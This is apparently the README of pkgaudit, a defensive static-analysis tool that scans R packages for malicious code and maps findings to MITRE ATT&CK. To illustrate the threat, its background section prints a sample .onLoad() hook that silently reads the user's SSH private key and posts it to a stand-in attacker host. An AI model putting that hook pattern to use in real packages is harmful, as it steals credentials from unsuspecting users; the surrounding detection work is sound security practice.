# pkgaudit

[![R-CMD-check](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml)

pkgaudit provides security-focused static code analysis for R. It searches R source code for possibly malicious patterns and, if found, returns the results with a clear explanation of the pattern and its relationship to the [MITRE ATT&CK](https://attack.mitre.org/) framework of adversary tactics and techniques.

## Background

R is a statistical programming language widely used in environments processing sensitive data: clinical trial analyses, government statistics, financial risk modeling, academic research, and more. 

R packages are the primary mechanism for sharing R code. They are also potential attack vectors. When a user calls `install.packages()` or `library()`, for example, R automatically executes any code in hooks like `.onLoad()` and `.onAttach()`. A malicious or compromised package can run arbitrary code on the user's system without any action beyond the normal R workflow.

A minimal example of what a malicious `.onLoad()` hook might look like is:

``` r
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- readLines("~/.ssh/id_rsa")
    httr::POST("https://attacker.com/collect",
               body = list(key = paste(key, collapse = "\n")))
  }, error = function(e) invisible(NULL))
}
```

This code reads the user's SSH private key and sends it to an external server whenever the package is loaded. The `tryCatch()` wrapper suppresses any errors, so the package loads normally and the user sees nothing unusual.

This is not a theoretical risk. The same attack pattern has been documented repeatedly in ecosystems adjacent to R. In 2022, the Python package ctx on PyPI was compromised to exfiltrate environment variables — including cloud credentials — from data scientists' systems. In 2024, the Python package ultralytics, a widely used computer vision library, was compromised to distribute a cryptominer to its users.

pkgaudit aims to provide one layer of defense against an underappreciated risk. A pkgaudit finding does not necessarily indicate malicious code, but prospective users should review the code prior to running it.

## Threat Model

R's use in environments handling sensitive data makes it an attractive target for a broad range of threat actors. The assets at risk include both the data processed in R sessions and the underlying systems on which R runs, which provide compute resources and credentials for lateral movement. pkgaudit v0.1.0 focuses on lifecycle hooks (`.onLoad()`, `.onAttach()`) as the primary attack surface.

## Installation

You can install pkgaudit as follows:

``` r
remotes::install_github("tylerjssmith/pkgaudit")
```

## Database Integrity

pkgaudit detects patterns using a SQLite database of rules shipped with the package at `inst/db/rules.db`. To verify that your installed copy of the database has not been modified since publication, check its SHA-256 hash against the value published here:

``` r
digest::digest(
  system.file("db", "rules.db", package = "pkgaudit"),
  algo = "sha256",
  file = TRUE
)
```
Expected SHA-256: `b162b0876e35126b8fd2934c75327fe8e281b3c17e883a2ec4ab5e7eb67874cf`

The hash is regenerated automatically by `inst/scripts/build_rules.R` whenever the database is rebuilt and should match the value above exactly.

## Usage

A file may be scanned as follows:

``` r
library(pkgaudit)
rules    <- load_rules()
findings <- audit_package("path/to/package", rules = rules)

# Record the rules version for reproducibility
attr(findings, "rules_version") <- rules_version()
```




